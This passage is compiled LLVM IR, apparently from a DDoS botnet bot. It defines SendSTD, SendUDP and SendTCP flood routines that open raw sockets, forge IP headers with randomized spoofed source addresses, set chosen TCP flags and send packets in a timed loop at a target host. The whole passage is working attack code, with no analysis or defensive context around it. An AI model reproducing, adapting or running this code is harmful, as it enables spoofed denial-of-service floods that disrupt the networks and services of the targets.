  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %64, %3
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 75, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #11
  unreachable

; <label>:63:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %64

; <label>:64:                                     ; preds = %63, %38
  %65 = load i32, i32* %11, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %206

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %206

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %206

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %61, %56
  %58 = load i32, i32* %17, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %17, align 4
  %60 = icmp ne i32 %58, 0
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %57
  %62 = call i64 @time(i64* null) #5
  %63 = call i32 @rand_cmwc()
  %64 = zext i32 %63 to i64
  %65 = xor i64 %62, %64
  %66 = trunc i64 %65 to i32
  call void @srand(i32 %66) #5
  %67 = call i32 @rand() #5
  call void @init_rand(i32 %67)
  br label %57

; <label>:68:                                     ; preds = %57
  %69 = load i32, i32* %12, align 4
  %70 = sub nsw i32 32, %69
  %71 = shl i32 1, %70
  %72 = sub nsw i32 %71, 1
  %73 = xor i32 %72, -1
  store i32 %73, i32* %18, align 4
  %74 = load i32, i32* %10, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 28, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %19, align 8
  %78 = alloca i8, i64 %76, align 16
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %20, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.udphdr*
  store %struct.udphdr* %83, %struct.udphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %18, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 8, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 17, i32 %94)
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 8, %96
  %98 = trunc i64 %97 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #10
  %100 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %101 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %100, i32 0, i32 0
  %102 = bitcast %union.anon.1* %101 to %struct.anon.2*
  %103 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %102, i32 0, i32 2
  store i16 %99, i16* %103, align 2
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %107 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.1* %107 to %struct.anon.2*
  %109 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %108, i32 0, i32 0
  store i16 %105, i16* %109, align 2
  %110 = load i32, i32* %8, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %114

; <label>:112:                                    ; preds = %68
  %113 = call i32 @rand_cmwc()
  br label %119

; <label>:114:                                    ; preds = %68
  %115 = load i32, i32* %8, align 4
  %116 = trunc i32 %115 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #10
  %118 = zext i16 %117 to i32
  br label %119

; <label>:119:                                    ; preds = %114, %112
  %120 = phi i32 [ %113, %112 ], [ %118, %114 ]
  %121 = trunc i32 %120 to i16
  %122 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %123 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.1* %123 to %struct.anon.2*
  %125 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %124, i32 0, i32 1
  store i16 %121, i16* %125, align 2
  %126 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %127 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.1* %127 to %struct.anon.2*
  %129 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %128, i32 0, i32 3
  store i16 0, i16* %129, align 2
  %130 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %131 = bitcast %struct.udphdr* %130 to i8*
  %132 = getelementptr inbounds i8, i8* %131, i64 8
  %133 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %132, i32 %133)
  %134 = bitcast i8* %78 to i16*
  %135 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  %137 = load i16, i16* %136, align 2
  %138 = zext i16 %137 to i32
  %139 = call zeroext i16 @csum(i16* %134, i32 %138)
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 7
  store i16 %139, i16* %141, align 2
  %142 = call i64 @time(i64* null) #5
  %143 = load i32, i32* %9, align 4
  %144 = sext i32 %143 to i64
  %145 = add nsw i64 %142, %144
  %146 = trunc i64 %145 to i32
  store i32 %146, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %147

; <label>:147:                                    ; preds = %201, %200, %119
  br label %148

; <label>:148:                                    ; preds = %147
  %149 = load i32, i32* %15, align 4
  %150 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %151 = call i64 @sendto(i32 %149, i8* %78, i64 %76, i32 0, %struct.sockaddr* %150, i32 16)
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.1* %155 to %struct.anon.2*
  %157 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %156, i32 0, i32 0
  store i16 %153, i16* %157, align 2
  %158 = load i32, i32* %8, align 4
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %148
  %161 = call i32 @rand_cmwc()
  br label %167

; <label>:162:                                    ; preds = %148
  %163 = load i32, i32* %8, align 4
  %164 = trunc i32 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #10
  %166 = zext i16 %165 to i32
  br label %167

; <label>:167:                                    ; preds = %162, %160
  %168 = phi i32 [ %161, %160 ], [ %166, %162 ]
  %169 = trunc i32 %168 to i16
  %170 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon.1* %171 to %struct.anon.2*
  %173 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %172, i32 0, i32 1
  store i16 %169, i16* %173, align 2
  %174 = call i32 @rand_cmwc()
  %175 = trunc i32 %174 to i16
  %176 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load i32, i32* %18, align 4
  %179 = call i32 @getRandomIP(i32 %178)
  %180 = call i32 @htonl(i32 %179) #10
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = bitcast i8* %78 to i16*
  %184 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 2
  %186 = load i16, i16* %185, align 2
  %187 = zext i16 %186 to i32
  %188 = call zeroext i16 @csum(i16* %183, i32 %187)
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 7
  store i16 %188, i16* %190, align 2
  %191 = load i32, i32* %23, align 4
  %192 = load i32, i32* %14, align 4
  %193 = icmp eq i32 %191, %192
  br i1 %193, label %194, label %201

; <label>:194:                                    ; preds = %167
  %195 = call i64 @time(i64* null) #5
  %196 = load i32, i32* %22, align 4
  %197 = sext i32 %196 to i64
  %198 = icmp sgt i64 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %194
  br label %204

; <label>:200:                                    ; preds = %194
  store i32 0, i32* %23, align 4
  br label %147

; <label>:201:                                    ; preds = %167
  %202 = load i32, i32* %23, align 4
  %203 = add i32 %202, 1
  store i32 %203, i32* %23, align 4
  br label %147

; <label>:204:                                    ; preds = %199
  %205 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %205)
  br label %206

; <label>:206:                                    ; preds = %204, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %393

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %393

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %393

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %68

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub nsw i32 32, %63
  %65 = shl i32 1, %64
  %66 = sub nsw i32 %65, 1
  %67 = xor i32 %66, -1
  store i32 %67, i32* %19, align 4
  br label %68

; <label>:68:                                     ; preds = %62, %61
  %69 = load i32, i32* %12, align 4
  %70 = sext i32 %69 to i64
  %71 = add i64 40, %70
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %20, align 8
  %73 = alloca i8, i64 %71, align 16
  %74 = bitcast i8* %73 to %struct.iphdr*
  store %struct.iphdr* %74, %struct.iphdr** %21, align 8
  %75 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %76 = bitcast %struct.iphdr* %75 to i8*
  %77 = getelementptr i8, i8* %76, i64 20
  %78 = bitcast i8* %77 to %struct.tcphdr*
  store %struct.tcphdr* %78, %struct.tcphdr** %22, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %81 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = load i32, i32* %19, align 4
  %84 = call i32 @getRandomIP(i32 %83)
  %85 = call i32 @htonl(i32 %84) #10
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = add i64 20, %87
  %89 = trunc i64 %88 to i32
  call void @makeIPPacket(%struct.iphdr* %79, i32 %82, i32 %85, i8 zeroext 6, i32 %89)
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %93 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %92, i32 0, i32 0
  %94 = bitcast %union.anon* %93 to %struct.anon.0*
  %95 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %94, i32 0, i32 0
  store i16 %91, i16* %95, align 4
  %96 = call i32 @rand_cmwc()
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 2
  store i32 %96, i32* %100, align 4
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon* %102 to %struct.anon.0*
  %104 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %103, i32 0, i32 3
  store i32 0, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon* %106 to %struct.anon.0*
  %108 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %107, i32 0, i32 4
  %109 = load i16, i16* %108, align 4
  %110 = and i16 %109, -241
  %111 = or i16 %110, 80
  store i16 %111, i16* %108, align 4
  %112 = load i8*, i8** %11, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.152, i32 0, i32 0)) #9
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %158, label %115

; <label>:115:                                    ; preds = %68
  %116 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon* %117 to %struct.anon.0*
  %119 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = and i16 %120, -513
  %122 = or i16 %121, 512
  store i16 %122, i16* %119, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon* %124 to %struct.anon.0*
  %126 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %125, i32 0, i32 4
  %127 = load i16, i16* %126, align 4
  %128 = and i16 %127, -1025
  %129 = or i16 %128, 1024
  store i16 %129, i16* %126, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon* %131 to %struct.anon.0*
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -257
  %136 = or i16 %135, 256
  store i16 %136, i16* %133, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon* %138 to %struct.anon.0*
  %140 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %139, i32 0, i32 4
  %141 = load i16, i16* %140, align 4
  %142 = and i16 %141, -4097
  %143 = or i16 %142, 4096
  store i16 %143, i16* %140, align 4
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon* %145 to %struct.anon.0*
  %147 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %146, i32 0, i32 4
  %148 = load i16, i16* %147, align 4
  %149 = and i16 %148, -2049
  %150 = or i16 %149, 2048
  store i16 %150, i16* %147, align 4
  %151 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %152 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %151, i32 0, i32 0
  %153 = bitcast %union.anon* %152 to %struct.anon.0*
  %154 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %153, i32 0, i32 4
  %155 = load i16, i16* %154, align 4
  %156 = and i16 %155, -8193
  %157 = or i16 %156, 8192
  store i16 %157, i16* %154, align 4
  br label %158

; <label>:158:                                    ; preds = %115, %68
  %159 = load i8*, i8** %11, align 8
  %160 = call i32 @strcmp(i8* %159, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i32 0, i32 0)) #9
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %177, label %162

; <label>:162:                                    ; preds = %158
  %163 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = and i16 %167, -513
  %169 = or i16 %168, 512
  store i16 %169, i16* %166, align 4
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon* %171 to %struct.anon.0*
  %173 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -8193
  %176 = or i16 %175, 8192
  store i16 %176, i16* %173, align 4
  br label %177

; <label>:177:                                    ; preds = %162, %158
  %178 = load i8*, i8** %11, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.154, i32 0, i32 0)) #9
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %196, label %181

; <label>:181:                                    ; preds = %177
  %182 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon* %183 to %struct.anon.0*
  %185 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %184, i32 0, i32 4
  %186 = load i16, i16* %185, align 4
  %187 = and i16 %186, -513
  %188 = or i16 %187, 512
  store i16 %188, i16* %185, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon* %190 to %struct.anon.0*
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 4
  %193 = load i16, i16* %192, align 4
  %194 = and i16 %193, -4097
  %195 = or i16 %194, 4096
  store i16 %195, i16* %192, align 4
  br label %283

; <label>:196:                                    ; preds = %177
  %197 = load i8*, i8** %11, align 8
  %198 = call i8* @strtok(i8* %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0)) #5
  store i8* %198, i8** %23, align 8
  br label %199

; <label>:199:                                    ; preds = %280, %196
  %200 = load i8*, i8** %23, align 8
  %201 = icmp ne i8* %200, null
  br i1 %201, label %202, label %282

; <label>:202:                                    ; preds = %199
  %203 = load i8*, i8** %23, align 8
  %204 = call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %205 = icmp ne i32 %204, 0
  br i1 %205, label %214, label %206

; <label>:206:                                    ; preds = %202
  %207 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 0
  %209 = bitcast %union.anon* %208 to %struct.anon.0*
  %210 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %211, -513
  %213 = or i16 %212, 512
  store i16 %213, i16* %210, align 4
  br label %280

; <label>:214:                                    ; preds = %202
  %215 = load i8*, i8** %23, align 8
  %216 = call i32 @strcmp(i8* %215, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.157, i32 0, i32 0)) #9
  %217 = icmp ne i32 %216, 0
  br i1 %217, label %226, label %218

; <label>:218:                                    ; preds = %214
  %219 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = bitcast %union.anon* %220 to %struct.anon.0*
  %222 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = and i16 %223, -1025
  %225 = or i16 %224, 1024
  store i16 %225, i16* %222, align 4
  br label %279

; <label>:226:                                    ; preds = %214
  %227 = load i8*, i8** %23, align 8
  %228 = call i32 @strcmp(i8* %227, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.158, i32 0, i32 0)) #9
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %238, label %230

; <label>:230:                                    ; preds = %226
  %231 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon* %232 to %struct.anon.0*
  %234 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = and i16 %235, -257
  %237 = or i16 %236, 256
  store i16 %237, i16* %234, align 4
  br label %278

; <label>:238:                                    ; preds = %226
  %239 = load i8*, i8** %23, align 8
